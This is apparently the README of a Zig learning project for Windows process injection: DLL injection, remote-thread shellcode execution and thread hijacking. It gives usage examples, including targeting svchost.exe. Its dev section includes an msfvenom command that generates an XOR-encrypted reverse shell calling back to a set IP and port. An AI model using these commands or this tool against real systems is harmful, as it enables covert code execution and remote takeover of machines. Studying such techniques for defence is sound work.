# ZInjector

Simple Process injector for Windows (for now) written in Zig.


> [!NOTE]
> This is my first project in Zig, so the code is pretty rough. My goal is to learn Zig and perform process injection. I haven't decided what to implement yet, but the first steps are to learn Zig and carry out a simple process injection attack on Windows.

## Usage

### General syntax

```sh
zinjector <subcommand> [OPTIONS]
```

Most common:

* `zinjector --help` — general help
* `zinjector <subcommand> --help` — help for a subcommand

---

### Subcommands

#### `dll`

Performs a DLL injection into the target process.

Syntax:

```sh
zinjector dll --dll_path <path> (--pid <PID> | --process_name <name>)
```

Options:

* `--dll_path, -d` *(required)* — path to the DLL (e.g. `C:\tools\payload.dll`)
* `--pid, -p` — numeric PID of the target process
* `--process_name, -n` — executable name of the target process (e.g. `notepad.exe`)

Examples:

```sh
zinjector dll -d "C:\payloads\hook.dll" -p 1234
zinjector dll -d ./payload.dll -n notepad.exe
```

Notes:

* Provide **either** `--pid` **or** `--process_name`. If both are provided, behavior depends on implementation (prefer PID for precision).
* Ensure the DLL architecture (x86/x64) matches the target process architecture.
* Administrative privileges may be required.

---

#### `thread`

Creates a remote thread in the target process and runs an in-memory payload (shellcode).

Syntax:

```sh
zinjector thread (--pid <PID> | --process_name <name>)
```

Options:

* `--pid, -p` — numeric PID of the target process
* `--process_name, -n` — executable name of the target process

Examples:

```sh
zinjector thread -p 4321
zinjector thread -n Notepad.exe
```

Notes:

* The payload (shellcode) must be provided or obtained according to the implementation (file, stdin, embedded).
* Verify architecture and calling convention compatibility.
* Elevated privileges may be necessary.

---

#### `hijacking`

Performs thread hijacking: suspends a target thread, modifies its context, and resumes it to execute the payload.

Syntax:

```sh
zinjector hijacking --pid <PID>
```

Options:

* `--pid, -p` — numeric PID of the target process (recommended)

Examples:

```sh
zinjector hijacking -p 5555
```

---

### Full examples

```sh
# Inject DLL by PID
zinjector dll -d "C:\tools\inject.dll" -p 1010

# Run shellcode via remote thread by process name
zinjector thread -n svchost.exe

# Hijack thread in process
zinjector hijacking -p 2020
```

---

## Some cool resource for learning Zig and Process Injection

- [Zig Guide](https://zig.guide/)
- [Zig Standard Library](https://ziglang.org/documentation/master/std/)
- [LearnXInYMinutes](https://learnxinyminutes.com/zig/)
- [Zig book](https://pedropark99.github.io/zig-book/)
- [Process Injection Techniques](https://www.ired.team/offensive-security/code-injection-process-injection)
- [MITRE](https://attack.mitre.org/techniques/T1055/)
- [DLL Injector C++](https://github.com/leetCipher/Malware.development/tree/main/dll-injector)
- [Cool cheasheet (zig_in_depth)](https://codeberg.org/dude_the_builder/zig_in_depth)
- https://github.com/marlersoft/zigwin32/tree/main
- https://raw.githubusercontent.com/marlersoft/zigwin32/refs/heads/main/win32/everything.zig
- https://black-hat-zig.cx330.tw/

### Legal and safety warning

These techniques modify other processes and can be used maliciously. Use only on machines and processes for which you have explicit authorization. The author assumes no responsibility for misuse.

## Dev

- Zig Version: 0.15.2
- OS: Arch Linux
- IDE: Zed
- LSP: Zls

Deps for cross-compiler on linux:  mingw-w64-headers,mingw-w64-gcc

## Todo:

- [x] PoC
- [x] Resolution of relative path to absolute path
- [x] Search process by name
- [x] Implement arguments parsing
- [x] Thread Remote creation with shellcode injection
- [ ] SetWindowHookEx Code Injection
- [ ] ...

## Command for dev/testing:

- Compile: `zig build -Dtarget=x86_64-windows -Dport=8080 -Dipv4=172.19.192.194 -Doptimize=ReleaseSmall --summary all`
- Test: `zig build test --summary all`
- Shellcode generator: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.118 LPORT=8080 -f zig --encrypt xor --encrypt-key a`
